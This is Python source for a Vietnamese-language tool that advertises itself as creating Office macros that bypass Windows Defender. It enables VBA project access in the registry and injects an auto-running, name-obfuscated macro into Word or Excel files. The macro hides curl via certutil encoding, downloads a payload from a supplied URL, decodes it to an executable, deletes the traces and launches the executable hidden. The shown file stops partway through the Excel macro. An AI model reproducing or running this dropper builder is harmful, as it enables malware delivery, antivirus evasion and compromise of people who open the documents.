import os
import random
import sys
import platform

# try:
#     os.system("pip install pyinstaller")
# except:
#     pass
import time

os.system("cls")

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE_BLUR = '\033[37m'
    CWHITE_BOLD = '\33[97m'
banner1 = """                                                  
# #                      #   #   #          #           
###  ## ### ### ###     # # ### ###  ## ### # # ### ### 
### # # #   #   # #     ###  #   #  # # #   ##  ##  #   
# # ### ### #   ###     # #  ##  ## ### ### # # ### #   
# #                     # #                                                                               
"""
banner2 = """
M   M                     AA   t   t           k            
MM MM                    A  A  t   t           k k          
M M M  aa  ccc rrr ooo   AAAA ttt ttt  aa  ccc kk   eee rrr 
M   M a a c    r   o o   A  A  t   t  a a c    k k  e e r   
M   M aaa  ccc r   ooo   A  A  tt  tt aaa  ccc k  k ee  r                                                                                                 
"""
banner3 = """
 #     #                                   #                                                   
 ##   ##   ##    ####  #####   ####       # #   ##### #####   ##    ####  #    # ###### #####  
 # # # #  #  #  #    # #    # #    #     #   #    #     #    #  #  #    # #   #  #      #    # 
 #  #  # #    # #      #    # #    #    #     #   #     #   #    # #      ####   #####  #    # 
 #     # ###### #      #####  #    #    #######   #     #   ###### #      #  #   #      #####  
 #     # #    # #    # #   #  #    #    #     #   #     #   #    # #    # #   #  #      #   #  
 #     # #    #  ####  #    #  ####     #     #   #     #   #    #  ####  #    # ###### #    #                                                                                             
"""
banner4 = """
 __   __                                     .     .     .                  \                 
 |    |    ___    ___  .___    __.          /|    _/_   _/_     ___    ___  |   ,   ___  .___ 
 |\  /|   /   ` .'   ` /   \ .'   \        /  \    |     |     /   ` .'   ` |  /  .'   ` /   \\
 | \/ |  |    | |      |   ' |    |       /---'\   |     |    |    | |      |-<   |----' |   '
 /    /  `.__/|  `._.' /      `._.'     ,'      \  \__/  \__/ `.__/|  `._.' /  \_ `.___, /   
"""
banner5 = """
______________________________________________________________________________________
    _   _                                __                                           
    /  /|                                / |                          /               
---/| /-|----__----__---)__----__-------/__|--_/_--_/_----__----__---/-__----__---)__-
  / |/  |  /   ) /   ' /   ) /   )     /   |  /    /    /   ) /   ' /(     /___) /   )
_/__/___|_(___(_(___ _/_____(___/_____/____|_(_ __(_ __(___(_(___ _/___\__(___ _/_____ 
"""
banner6 = """
   _   _   _   _   _     _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \   / \ / \ / \ / \ / \ / \ / \ / \ 
 ( M | a | c | r | o ) ( A | t | t | a | c | k | e | r )
  \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
"""
banner7 = """
 __  __    __    ___  ____  _____      __   ____  ____   __    ___  _  _  ____  ____ 
(  \/  )  /__\  / __)(  _ \(  _  )    /__\ (_  _)(_  _) /__\  / __)( )/ )( ___)(  _ \\
 )    (  /(__)\( (__  )   / )(_)(    /(__)\  )(    )(  /(__)\( (__  )  (  )__)  )   /
(_/\/\_)(__)(__)\___)(_)\_)(_____)  (__)(__)(__)  (__)(__)(__)\___)(_)\_)(____)(_)\_)
"""
banner8 = """
_//       _//                                         _/         _//    _//                   _//                      
_/ _//   _///                                        _/ //       _//    _//                   _//                      
_// _// _ _//   _//       _///_/ _///   _//         _/  _//    _/_/ _/_/_/ _/   _//       _///_//  _//   _//    _/ _///
_//  _//  _// _//  _//  _//    _//    _//  _//     _//   _//     _//    _//   _//  _//  _//   _// _//  _/   _//  _//   
_//   _/  _//_//   _// _//     _//   _//    _//   _////// _//    _//    _//  _//   _// _//    _/_//   _///// _// _//   
_//       _//_//   _//  _//    _//    _//  _//   _//       _//   _//    _//  _//   _//  _//   _// _// _/         _//   
_//       _//  _// _///   _///_///      _//     _//         _//   _//    _//   _// _///   _///_//  _//  _////   _///                                                                                                                      
"""
banner9 = """
 _______                          _______ __   __               __               
|   |   |.---.-.----.----.-----. |   _   |  |_|  |_.---.-.----.|  |--.-----.----.
|       ||  _  |  __|   _|  _  | |       |   _|   _|  _  |  __||    <|  -__|   _|
|__|_|__||___._|____|__| |_____| |___|___|____|____|___._|____||__|__|_____|__|                                                                                
"""
banner10= """
888b     d888                                             d8888 888    888                      888                       
8888b   d8888                                            d88888 888    888                      888                       
88888b.d88888                                           d88P888 888    888                      888                       
888Y88888P888  8888b.   .d8888b 888d888 .d88b.         d88P 888 888888 888888  8888b.   .d8888b 888  888  .d88b.  888d888 
888 Y888P 888     "88b d88P"    888P"  d88""88b       d88P  888 888    888        "88b d88P"    888 .88P d8P  Y8b 888P"   
888  Y8P  888 .d888888 888      888    888  888      d88P   888 888    888    .d888888 888      888888K  88888888 888     
888   "   888 888  888 Y88b.    888    Y88..88P     d8888888888 Y88b.  Y88b.  888  888 Y88b.    888 "88b Y8b.     888     
888       888 "Y888888  "Y8888P 888     "Y88P"     d88P     888  "Y888  "Y888 "Y888888  "Y8888P 888  888  "Y8888  888                                                                                                                            
"""

banner11="""
.  .              .__. ,  ,       .        
|\/| _. _.._. _   [__]-+--+- _. _.;_/ _ ._.
|  |(_](_.[  (_)  |  | |  | (_](_.| \(/,[   
"""

banner12="""
  ___ ___                          _______ __   __              __               
 |   Y   .---.-.----.----.-----.  |   _   |  |_|  |_.---.-.----|  |--.-----.----.
 |.      |  _  |  __|   _|  _  |  |.  1   |   _|   _|  _  |  __|    <|  -__|   _|
 |. \_/  |___._|____|__| |_____|  |.  _   |____|____|___._|____|__|__|_____|__|  
 |:  |   |                        |:  |   |                                      
 |::.|:. |                        |::.|:. |                                      
 `--- ---'                        `--- ---'                                                                                                                 
"""

banner13="""
 +-+-+-+-+-+ +-+-+-+-+-+-+-+-+
 |M|a|c|r|o| |A|t|t|a|c|k|e|r|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+-+
"""
banner14="""
 __ __                       ___    _      _             _             
|  \  \ ___  ___  _ _  ___  | . | _| |_  _| |_ ___  ___ | |__ ___  _ _ 
|     |<_> |/ | '| '_>/ . \ |   |  | |    | | <_> |/ | '| / // ._>| '_>
|_|_|_|<___|\_|_.|_|  \___/ |_|_|  |_|    |_| <___|\_|_.|_\_\\___.|_| 
"""
banner15="""
 _   _                     __   _   _           _            
( `-' )                   (  ) ( ) ( )         ( )           
| \_/ | ___  __ __  ___   /o \ | | | |  ___  __| | _ ___  __ 
( ) ( )( o )/ /( _)( o ) ( __ )( _)( _)( o )/ /( _'(( o_)( _)
/_\ /_\/_^_\\\\_\/_\  \_/  /_\/_\/_\ /_\ /_^_\\\\_\/_\\\\_|\(  /_\ 
"""

banner16 = """
o   o                        O   o   o           o            
|\ /|                       / \  |   |           | /          
| O |  oo  o-o o-o o-o     o---o-o- -o-  oo  o-o OO   o-o o-o 
|   | | | |    |   | |     |   | |   |  | | |    | \  |-' |   
o   o o-o- o-o o   o-o     o   o o   o  o-o- o-o o  o o-o o                                                         
"""
banner17 = """
  __  __                           _   _   _             _             
 |  \/  | __ _  ___ _ __ ___      / \ | |_| |_ __ _  ___| | _____ _ __ 
 | |\/| |/ _` |/ __| '__/ _ \    / _ \| __| __/ _` |/ __| |/ / _ \ '__|
 | |  | | (_| | (__| | | (_) |  / ___ \ |_| || (_| | (__|   <  __/ |   
 |_|  |_|\__,_|\___|_|  \___/  /_/   \_\__|\__\__,_|\___|_|\_\___|_|     
"""
banner18 = """
,-,-,-.                        ,.   .  .          .           
`,| | |   ,-. ,-. ,-. ,-.     / |   |- |- ,-. ,-. | , ,-. ,-. 
  | ; | . ,-| |   |   | |    /~~|-. |  |  ,-| |   |<  |-' |   
  '   `-' `-^ `-' '   `-'  ,'   `-' `' `' `-^ `-' ' ` `-' '                                                      
"""
banner19 = """
______  ___                               _________________             ______              
___   |/  /_____ ___________________      ___    |_  /__  /______ _________  /______________
__  /|_/ /_  __ `/  ___/_  ___/  __ \     __  /| |  __/  __/  __ `/  ___/_  //_/  _ \_  ___/
_  /  / / / /_/ // /__ _  /   / /_/ /     _  ___ / /_ / /_ / /_/ // /__ _  ,<  /  __/  /    
/_/  /_/  \__,_/ \___/ /_/    \____/      /_/  |_\__/ \__/ \__,_/ \___/ /_/|_| \___//_/   
"""
banner20 = """
   __  ___                    ___  __  __           __          
  /  |/  /__ ____________    / _ |/ /_/ /____ _____/ /_____ ____
 / /|_/ / _ `/ __/ __/ _ \  / __ / __/ __/ _ `/ __/  '_/ -_) __/
/_/  /_/\_,_/\__/_/  \___/ /_/ |_\__/\__/\_,_/\__/_/\_\\\\__/_/   
"""



banner = random.randint(1, 20)

if platform.system().lower() == "windows":
    os.system('color')
    import win32com.client
    import winreg
else:
    print("\033[91m[+] Only for Windows :(")
    sys.exit()

def generate_random_string(low, high):
    length = random.randint(low, high)
    # letters = string.ascii_letters  # + string.digits
    return '_'.join([random.choice(data) for _ in range(length)])

def enableVbomWord():
    # Enable writing in macro (VBOM)
    # First fetch the application version
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  # do the operation in background
    version = objWord.Application.Version
    # print(version)
    # IT is necessary to exit office or value wont be saved
    objWord.Application.Quit()
    del objWord
    # Next change/set AccessVBOM registry value to 1
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    # print(color.GREEN,"[-] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)

def disableVbomWord():
    # Disable writing in VBA project
    #  Change/set AccessVBOM registry value to 0
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  # do the operation in background
    version = objWord.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    # print("\033[1;77m[-] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)

def enableVbomExcel():
    # Enable writing in macro (VBOM)
    # First fetch the application version

    # IT is necessary to exit office or value wont be saved
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = True  # do the operation in background
    version = objExcel.Application.Version
    print(version)
    objExcel.Application.Quit()
    del objExcel
    # Next change/set AccessVBOM registry value to 1
    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    #print("\033[1;77m[-] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)

#
# def enableVbomPowerPoint():
#     # Enable writing in macro (VBOM)
#     # First fetch the application version
#
#     # IT is necessary to exit office or value wont be saved
#     objPp = win32com.client.Dispatch("PowerPoint.Application")
#     objPp.Visible = True  # do the operation in background
#     # version = objPp.Application.Version
#     version = "16.0"
#     print(version)
#     # objPp.Application.Quit()
#     del objPp
#     # Next change/set AccessVBOM registry value to 1
#     keyval = "Software\\Microsoft\Office\\" + version + "\\Powerpoint\\Security"
#     #print("\033[1;77m[-] Set %s to 1...\033[0m" % keyval)
#     Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
#     winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  # "REG_DWORD"
#     winreg.CloseKey(Registrykey)

def disableVbomExcel():
    # Disable writing in VBA project
    #  Change/set AccessVBOM registry value to 0
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  # do the operation in background
    version = objExcel.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    # print("\033[1;77m[-] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)

#
# def disableVbomPowerpoint():
#     # Disable writing in VBA project
#     #  Change/set AccessVBOM registry value to 0
#     objExcel = win32com.client.Dispatch("Powerpoint.Application")
#     objExcel.Visible = False  # do the operation in background
#     version = objExcel.Application.Version
#     keyval = "Software\\Microsoft\Office\\" + version + "\\Powerpoint\\Security"
#     # print("\033[1;77m[-] Set %s to 0...\033[0m" % keyval)
#     Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
#     winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  # "REG_DWORD"
#     winreg.CloseKey(Registrykey)

def excelMacro(filepath,macro):

    enableVbomExcel()

    print(
        color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Khoi tao VbomExcel...")
    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)

    pathToExcelFile = path + '/' + filepath

    # open up an instance of Word with1 the win32com driver
    # open up an instance of Excel with the win32com driver
    excel = win32com.client.Dispatch("Excel.Application")

    # do the operation in background without actually opening Excel
    excel.Visible = True

    # open the excel workbook from the specified file
    try:
        workbook = excel.Workbooks.Open(Filename=pathToExcelFile)
        # insert the macro-string into the excel file
        excelModule = workbook.VBProject.VBComponents("ThisWorkbook")
        # excelModule = workbook.VBProject.VBComponents.Add(1)
        excelModule.CodeModule.AddFromString(macro)

        # remove personal info
        # print("\033[1;77m[-] Remove hidden data and personal info...\033[0m")
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Xoa thong tin an...")
        xlRDIAll = 99
        workbook.RemoveDocumentInformation(xlRDIAll)
        # save the workbook and close
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Dang luu file...")
        excel.Workbooks(1).Close(SaveChanges=1)
        # excel.Save()
        excel.Application.Quit()
        # garbage collection
        del excel

        # disable VBOM permission
        disableVbomExcel()
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Da tao thanh cong !!!")
        input(color.GREEN + color.BOLD + '     [>] Nhan Enter de tiep tuc ...')
    except:
        print(color.GREEN + color.BOLD +'     ['+color.RED+'-'+color.GREEN + color.BOLD+']:' + color.RED+" Khong tim thay File!")
        time.sleep(3)


def wordMacro(filepath,macro):

    enableVbomWord()

    print(color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Khoi tao VbomWord...")
    # print(color.GREEN," [!] Enable VbomWord...\033[0m")
    # # get directory where the script is located
    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)
    #
    # # set file paths and macro name accordingly - here we assume that the files are located in the same folder as the Python script
    pathToWordFile = path + '/' + filepath

    # open up an instance of Word with1 the win32com driver
    Word = win32com.client.Dispatch("Word.Application")

    # do the operation in background without actually opening Word
    Word.Visible = False

    # insert the macro-string into the Word file
    try:
        document = Word.Documents.Open(pathToWordFile)
        wordModule = document.VBProject.VBComponents("ThisDocument")
        wordModule.CodeModule.AddFromString(macro)

        # Remove Informations
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Xoa thong tin an...")
        wdRDIAll = 99
        document.RemoveDocumentInformation(wdRDIAll)
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Dang luu file...")
        document.Save()
        document.Close()
        Word.Application.Quit()
        # garbage collection
        del Word
        disableVbomWord()
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Da tao thanh cong !!!")
        input(color.GREEN + color.BOLD + '     [>] Nhan Enter de tiep tuc ...')
    except:
        print(color.GREEN + color.BOLD +'     ['+color.RED+'-'+color.GREEN + color.BOLD+']:' + color.RED+" Khong tim thay File!")
        time.sleep(3)


#
# def powerpointMacro(filepath,macro):
#     enableVbomPowerPoint()
#     print(
#         color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Khoi tao VbomPowerPoint...")
#     _file = os.path.abspath(sys.argv[0])
#     path = os.path.dirname(_file)
#
#     pathToPpFile = path + '/' + filepath
#
#     # open up an instance of Word with1 the win32com driver
#     # open up an instance of Excel with the win32com driver
#     Pp = win32com.client.Dispatch("PowerPoint.Application")
#
#     # do the operation in background without actually opening Excel
#     Pp.Visible = True
#     # open the excel workbook from the specified file
#     presentation = Pp.Presentations.Open(pathToPpFile,WithWindow=1)
#
#     # insert the macro-string into the excel file
#     PpModule = presentation.VBProject.VBComponents.Add("1")
#     # excelModule = workbook.VBProject.VBComponents.Add(1)
#     PpModule.CodeModule.AddFromString(macro)
#
#     # remove personal info
#     #print("\033[1;77m[-] Remove hidden data and personal info...\033[0m")
#     print(
#         color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Xoa thong tin an...")
#     xlRDIAll = 99
#     presentation.RemoveDocumentInformation(xlRDIAll)
#     # save the workbook and close
#     print(
#         color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Dang luu file...")
#     # Pp.SaveAs()
#     Pp.Application.Quit()
#     # garbage collection
#     del Pp
#
#     # disable VBOM permission
#     disableVbomPowerpoint()
#     print(color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Da tao thanh cong !!!")
#     input(color.GREEN + color.BOLD +'     [>] Nhan Enter de tiep tuc ...')

while(True):

    os.system("cls")
    print(color.YELLOW)
    if banner == 1: print(banner1)
    if banner == 2: print(banner2)
    if banner == 3: print(banner3)
    if banner == 4: print(banner4)
    if banner == 5: print(banner5)
    if banner == 6: print(banner6)
    if banner == 7: print(banner7)
    if banner == 8: print(banner8)
    if banner == 9: print(banner9)
    if banner == 10: print(banner10)
    if banner == 11: print(banner11)
    if banner == 12: print(banner12)
    if banner == 13: print(banner13)
    if banner == 14: print(banner14)
    if banner == 15: print(banner15)
    if banner == 16: print(banner16)
    if banner == 17: print(banner17)
    if banner == 18: print(banner18)
    if banner == 19: print(banner19)
    if banner == 20: print(banner20)

    author = '''{0}[{1}!{2}]--> {3}Version 2.0
{4}[{5}!{6}]--> {7}Tool creates Macros Office Bypass Windows Defender
{8}[{9}!{10}]-->{11} Author: {12}Le Duy Dung K53-MTA'''.format(color.YELLOW, color.RED, color.YELLOW,
                                                                   color.GREEN, color.YELLOW, color.RED,
                                                                   color.YELLOW, color.GREEN, color.YELLOW,
                                                                   color.RED, color.YELLOW, color.GREEN, color.YELLOW,
                                                                   color.GREEN, color.YELLOW)
    print(author)
    print(color.RED + "___________________________________________________________________________________\n")

    print(color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '1' + color.GREEN + color.BOLD + ']:' + color.CWHITE_BOLD + " Word Document  "+color.GREEN+"(.docm/.dotm)")
    print(color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '2' + color.GREEN + color.BOLD + ']:' + color.CWHITE_BOLD + " Excel Document "+color.GREEN+"(.xlsm/.xltm)")
    # print(color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '3' + color.GREEN + color.BOLD + ']:' + color.CWHITE_BOLD + " PowerPoint Document " + color.GREEN + "(.pptm/.potm)")

    mode = input(color.GREEN + color.BOLD +'     [>] Nhap lua chon (1/2): '+ color.CWHITE_BOLD)

    if mode.strip() == '1':
        print(color.GREEN + color.BOLD +' ['+color.CWHITE_BOLD+color.BOLD+'!'+color.GREEN + color.BOLD+']'+ color.CWHITE_BOLD + " Word Document")
        doc_file = input(
            color.GREEN + color.BOLD +'     [>] Nhap file .docm/.dotm: ' + color.CWHITE_BOLD)
        if not doc_file.lower().endswith(('.docm', '.dotm')):
            print(color.GREEN + color.BOLD +'     ['+color.RED+'-'+color.GREEN + color.BOLD+']:' + color.RED+" File khong hop le!")
            sys.exit()
        payload = input(
            color.GREEN + color.BOLD + '     [>] ' + "Nhap ten file payload: " + color.CWHITE_BOLD)
        url = input(color.GREEN + color.BOLD + '     [>] ' + "Nhap URL file .txt   : " + color.CWHITE_BOLD)
        if payload.lower().endswith('.exe'):
            payload = payload.replace('.exe', '')

        macro_word_script = """
        Public Sub Obfuscate6()
            Dim Obfuscate2 As String
            If Obfuscate2 = "Obfuscate3" Then
                Obfuscate2 = "Obfuscate3"
            ElseIf Obfuscate2 = "Obfuscate4" Then
                Obfuscate2 = "Obfuscate4"
            ElseIf Obfuscate2 = "Obfuscate5" Then
                Obfuscate2 = "Obfuscate5"
            Else
                Obfuscate2 = "Obfuscate6"
            End If
        End Sub
        
        Public Sub Obfuscate7()
            
        End Sub
        
        Private Sub Document_Open()
            
            Dim Obfuscate8 As Long
            Obfuscate8 = Obfuscate_Int1
            Dim Obfuscate2 As String
            Dim Obfuscate3 As String
            
            Dim strPath_curl_txt As String
            Dim strPath_curl_exe As String
            Dim url_file_txt As String
            Dim strPath_payload_txt As String
            Dim strPath_payload_exe As String
            Dim script As String
            Dim Document_Path As String

            
            If Obfuscate8 = Obfuscate_Int2 Then
                Dim Msg, Style, Title, Help, Ctxt, Response, MyString
                Msg = "Do you want to continue ?"    ' Define message.
                Style = vbYesNo Or vbCritical Or vbDefaultButton2    ' Define buttons.
                Title = "MsgBox Demonstration"    ' Define title.
                Help = "DEMO.HLP"    ' Define Help file.
                Ctxt = 1000    ' Define topic context. 
                Response = MsgBox(Msg, Style, Title, Help, Ctxt)
            End If
            If Obfuscate8 = Obfuscate_Int1 Then
                'Document_Path = ActiveDocument.Path
                Document_Path = "C:\Windows\Tasks"
                strPath_curl_txt = Document_Path + "\link_curl.txt"
                strPath_curl_exe = Document_Path + "\link_curl.exe"
                url_file_txt = \"""" + url + """\"
                strPath_payload_txt = Document_Path + "\link_dung.txt"
                strPath_payload_exe = Document_Path + \"""" + """\\""" + payload + """.exe\"


                script = script + "C:\Wind" + "ows\Sys"
                Dim Obfuscate1 As String
                script = script + "tem32\cmd.exe /c "
                Obfuscate1 = Obfuscate1 + strPath_curl_txt + strPath_curl_exe
                script = script + "xcopy C:\Windows\Sys"
                Obfuscate3 = Obfuscate1 + strPath_curl_txt + url_file_txt
                script = script + "tem32\cu" + "rl.exe " + Document_Path + " & "
                Obfuscate2 = Obfuscate1 + strPath_payload_txt + url_file_txt
                script = script + "certu" + "til "
                Obfuscate1 = Obfuscate1 + strPath_payload_txt + strPath_payload_exe
                script = script + "-e" + "ncode " + Document_Path + "\cu" + "rl.exe " + strPath_curl_txt + " & "
                Obfuscate1 = Obfuscate1 + script + strPath_payload_exe
                script = script + "cer" + "tutil "
                Obfuscate1 = Obfuscate1 + script + Document_Path
                script = script + "-decode " + strPath_curl_txt + " " + strPath_curl_exe + " & "
                Obfuscate1 = Obfuscate1 + strPath_curl_txt + Document_Path
                script = script + strPath_curl_exe + " " + url_file_txt + " -o " + strPath_payload_txt + " & "
                Obfuscate1 = Obfuscate1 + strPath_curl_txt + Document_Path
                script = script + "certutil "
                Obfuscate2 = Obfuscate1 + strPath_curl_txt + strPath_curl_exe
                script = script + "-de" + "code " + strPath_payload_txt + " " + strPath_payload_exe + " & "
                Obfuscate1 = Obfuscate1 + url_file_txt + strPath_curl_exe
                script = script + "del " + Document_Path + "\cu" + "rl.exe & "
                Obfuscate3 = Obfuscate1 + url_file_txt + strPath_payload_txt
                script = script + "del " + strPath_curl_txt + " & "
                Obfuscate1 = Obfuscate1 + strPath_payload_exe + strPath_payload_txt
                script = script + "del " + strPath_curl_exe + " & "
                Obfuscate2 = Obfuscate1 + strPath_payload_exe + script
                script = script + "del " + strPath_payload_txt + " & "
                script = script + "STA" + "RT /MIN " +  strPath_payload_exe + " 1 2 3 4 & e" + "xit"
                Obfuscate2 = Obfuscate1 + Document_Path + script
                Obfuscate3 = Obfuscate2 + url_file_txt + strPath_curl_exe
                Shell (script),vbHidden
            End If

        End Sub
        

        """

        import random

        f = open('dictionary_Eng.txt', 'r', encoding='utf-8')
        data = f.read().split('\n')
        f.close()

        macro_script = macro_word_script.replace("strPath_curl_txt", generate_random_string(2, 3))
        macro_script = macro_script.replace("strPath_curl_exe", generate_random_string(2, 3))
        macro_script = macro_script.replace("url_file_txt", generate_random_string(2, 3))
        macro_script = macro_script.replace("strPath_payload_txt", generate_random_string(2, 3))
        macro_script = macro_script.replace("strPath_payload_exe", generate_random_string(2, 3))
        macro_script = macro_script.replace("script", generate_random_string(2, 4))
        macro_script = macro_script.replace("Document_Path", generate_random_string(2, 3))
        macro_script = macro_script.replace("link_curl", generate_random_string(2, 3))
        macro_script = macro_script.replace("link_dung", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate1", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate2", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate3", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate4", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate5", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate6", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate7", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate8", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate_Int1", str(random.randint(1, 10000)))
        macro_script = macro_script.replace("Obfuscate_Int2", str(random.randint(1, 10000)))

        wordMacro(doc_file, macro_script)
    elif mode.strip() == '2':
        print(
            color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " Excel Document")
        excel_file = input(
            color.GREEN + color.BOLD + '     [>] Nhap file .xlsm/.xltm: ' + color.CWHITE_BOLD)
        if not excel_file.lower().endswith(('.xlsm', '.xltm')):
            print(
                color.GREEN + color.BOLD + '     [' + color.RED + '-' + color.GREEN + color.BOLD + ']:' + color.RED + " File khong hop le!")
            sys.exit()
        payload = input(
            color.GREEN + color.BOLD + '     [>] ' + "Nhap ten file payload: " + color.CWHITE_BOLD)
        url = input(color.GREEN + color.BOLD + '     [>] ' + "Nhap URL file .txt   : " + color.CWHITE_BOLD)
        if payload.lower().endswith('.exe'):
            payload = payload.replace('.exe', '')

        macro_excel_script = """
         Public Sub Obfuscate6()
            Dim Obfuscate2 As String
            If Obfuscate2 = "Obfuscate3" Then
                Obfuscate2 = "Obfuscate3"
            ElseIf Obfuscate2 = "Obfuscate4" Then
                Obfuscate2 = "Obfuscate4"
            ElseIf Obfuscate2 = "Obfuscate5" Then
                Obfuscate2 = "Obfuscate5"
            Else
                Obfuscate2 = "Obfuscate6"
            End If
        End Sub
        
        Public Sub Obfuscate7()
            
        End Sub
               Private Sub Workbook_Open()
                Dim Obfuscate8 As Long
                Obfuscate8 = Obfuscate_Int1
                Dim Obfuscate2 As String
                Dim Obfuscate3 As String
                
               Dim strPath_curl_txt As String
               Dim strPath_curl_exe As String
               Dim url_file_txt As String
               Dim strPath_payload_txt As String
               Dim strPath_payload_exe As String
               Dim script As String
               Dim Document_Path As String
            If Obfuscate8 = Obfuscate_Int2 Then
                Dim Msg, Style, Title, Help, Ctxt, Response, MyString
                Msg = "Do you want to continue ?"    ' Define message.
                Style = vbYesNo Or vbCritical Or vbDefaultButton2    ' Define buttons.
                Title = "MsgBox Demonstration"    ' Define title.
                Help = "DEMO.HLP"    ' Define Help file.
                Ctxt = 1000    ' Define topic context. 
                Response = MsgBox(Msg, Style, Title, Help, Ctxt)
            End If
            If Obfuscate8 = Obfuscate_Int1 Then
               Document_Path = "C:\Windows\Tasks"
               strPath_curl_txt = Document_Path + "\link_curl.txt"
               strPath_curl_exe = Document_Path + "\link_curl.exe"
               url_file_txt = \"""" + url + """\"
               strPath_payload_txt = Document_Path + "\link_dung.txt"
               strPath_payload_exe = Document_Path + \"""" + """\\""" + payload + """.exe\"



               script = script + "C:\Windows\Sys"
               Dim Obfuscate1 As String
               script = script + "tem32\cmd.exe /c "
               Obfuscate1 = Obfuscate1 + strPath_curl_txt + strPath_curl_exe
               script = script + "xcopy C:\Windows\Sys"
               Obfuscate1 = Obfuscate1 + strPath_curl_txt + url_file_txt
               script = script + "tem32\cu" + "rl.exe " + Document_Path + " & "
               Obfuscate1 = Obfuscate1 + strPath_payload_txt + url_file_txt
               script = script + "certutil "
               Obfuscate1 = Obfuscate1 + strPath_payload_txt + strPath_payload_exe
               script = script + "-encode " + Document_Path + "\cu" + "rl.exe " + strPath_curl_txt + " & "
               Obfuscate1 = Obfuscate1 + script + strPath_payload_exe
               script = script + "certutil "
               Obfuscate1 = Obfuscate1 + script + Document_Path
               script = script + "-decode " + strPath_curl_txt + " " + strPath_curl_exe + " & "
               Obfuscate1 = Obfuscate1 + strPath_curl_txt + Document_Path
